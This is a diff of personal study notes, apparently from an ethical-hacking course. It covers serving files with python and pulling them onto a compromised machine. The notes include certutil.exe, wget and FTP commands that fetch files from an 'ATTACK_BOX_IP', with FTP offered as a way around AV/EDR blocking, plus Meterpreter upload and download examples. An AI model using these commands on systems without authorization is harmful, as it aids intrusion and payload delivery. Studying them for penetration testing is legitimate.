@@ -1,48 +1,48 @@
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Transfering files (including executables) between devices by turning one device into a simple web server using python (and executing them); written for Linux (Windows will be a bit different in some things):
 
-1) turn device that has file on it into a web server by going to the directory where file resides and opening terminal
-2) command:
-$ sudo python3 -m http.server <PORT, e.g. 9000>
-now this device is a server
-3) On the device that you wish to download the file to (i.e. the client), open terminal in directory you want file to download to
-4) command:
-$ wget http://<IP_of_SERVER>:<SERVER_PORT, e.g. 9000>/<FILE_NAME>
-Note: you may not be allowed to download files into every directory. The /tmp directory is likely to allow files to be downloaded to it using wget.
-5) allow execution of the file, command:
-$ chmod a+x <FILE_NAME>
-6)execute the file from the directory it is in, command:
+1) turn device that has file on it into a web server by going to the directory where file resides and opening terminal  
+2) command:  
+$ sudo python3 -m http.server <PORT, e.g. 9000>  
+now this device is a server  
+3) On the device that you wish to download the file to (i.e. the client), open terminal in directory you want file to download to  
+4) command:  
+$ wget http://<IP_of_SERVER>:<SERVER_PORT, e.g. 9000>/<FILE_NAME>  
+Note: you may not be allowed to download files into every directory. The /tmp directory is likely to allow files to be downloaded to it using wget.  
+5) allow execution of the file, command:  
+$ chmod a+x <FILE_NAME>  
+6)execute the file from the directory it is in, command:  
 $ ./<FILE_NAME>
 
-Note: if you have access to a web browser on the machine you are transferring the file to, you can enter simply enter:
-http://<IP_of_SERVER>:<SERVER_PORT, e.g. 9000>/<FILE_NAME>
+Note: if you have access to a web browser on the machine you are transferring the file to, you can enter simply enter:  
+http://<IP_of_SERVER>:<SERVER_PORT, e.g. 9000>/<FILE_NAME>  
 into the browser's url box and hit enter; you will be asked if you want to save the file; simply click ok and the file will be downloaded to the target machine.
 
-Sources:
-https://docs.python.org/3/library/http.server.html
-https://www.askpython.com/python-modules/python-httpserver
-https://www.howtogeek.com/281663/how-to-use-wget-the-ultimate-command-line-downloading-tool/
+Sources:  
+https://docs.python.org/3/library/http.server.html  
+https://www.askpython.com/python-modules/python-httpserver  
+https://www.howtogeek.com/281663/how-to-use-wget-the-ultimate-command-line-downloading-tool/  
 https://www.wikihow.com/Run-a-Program-from-the-Command-Line-on-Linux
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-from: Heath Adams - The Cyber Mentor ; Practical Ethical Hacking - The Complete Course
+from: Heath Adams - The Cyber Mentor ; Practical Ethical Hacking - The Complete Course  
 "File Transfers Review" - https://academy.tcm-sec.com/courses/1152300/lectures/24781512
 
 If you have compromised a machine and are looking to transfer a file to it from your Linux attack box, here are some good options:
 
-1) HTTP 
-Host the file on your attack box and turn it into a webserver by opening a terminal in the file's directory and using the command:
+1) HTTP  
+Host the file on your attack box and turn it into a webserver by opening a terminal in the file's directory and using the command:  
 $ sudo python3 -m SimpleHTTPServer 80
 
-Retrieve the file from your attack box from a compromised Windows machine using the command:
+Retrieve the file from your attack box from a compromised Windows machine using the command:  
 > certutil.exe -urlcache -f http://<ATTACK_BOX_IP>/<FILE_NAME> <NAME_YOU_WANT_FILE_TO_HAVE_ON_WINDOWS_MACHINE>
 
 NOTE: if you have browser access on the compromised machine you can navigate to http://<ATTACK_BOX_IP>/<FILE_NAME> and download
 
-NOTE: If the compromised machine is a Linux OS use the following command to retrieve the file:
+NOTE: If the compromised machine is a Linux OS use the following command to retrieve the file:  
 $ wget http://<IP_of_ATTACK_BOX>:<PORT>, e.g. 80>/<FILE_NAME>
 
-2) FTP
-If the compromised Windows machine is blocking certutil.exe with its AV/EDR you can try FTP instead.
+2) FTP  
+If the compromised Windows machine is blocking certutil.exe with its AV/EDR you can try FTP instead.  
 Host the file on your attack box and turn it into a FTP server by opening a terminal in the file's directory and using the command:
 
 $ sudo python3 -m pyftpdlib 21
@@ -51,23 +51,23 @@ then retrieve it by giving the following command in the Windows machine's CLI:
 
 > ftp <ATTACK_BOX_IP>
 
-3) Metasploit
+3) Metasploit  
 Metasploit has an upload/download feature that works within a meterpreter shell
 
 [from: "Meterpreter upload Command" https://www.youtube.com/watch?v=JPjM-cCQuVs
 
-Uploading to the compromised Windows machine from your attack box:
+Uploading to the compromised Windows machine from your attack box:  
 meterpreter> upload <PATH_TO_FILE_ON_ATTACK_MACHINE/FILENAME> <PATH_TO_WHERE_YOU_WANT_FILE_TO_BE_ON_COMPROMISED_MACHINE>
 
-Downloading from the compromised machine to your attack box:
+Downloading from the compromised machine to your attack box:  
 from: https://www.offsec.com/metasploit-unleashed/meterpreter-basics/#download
 
-download
+download  
 The download command downloads a file from the remote machine. Note the use of the double-slashes when giving the Windows path.
 
-meterpreter > download c:\\boot.ini
-[*] downloading: c:\boot.ini -> c:\boot.ini
-[*] downloaded : c:\boot.ini -> c:\boot.ini/boot.ini
+meterpreter > download c:\\boot.ini  
+[*] downloading: c:\boot.ini -> c:\boot.ini  
+[*] downloaded : c:\boot.ini -> c:\boot.ini/boot.ini  
 meterpreter > ]
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
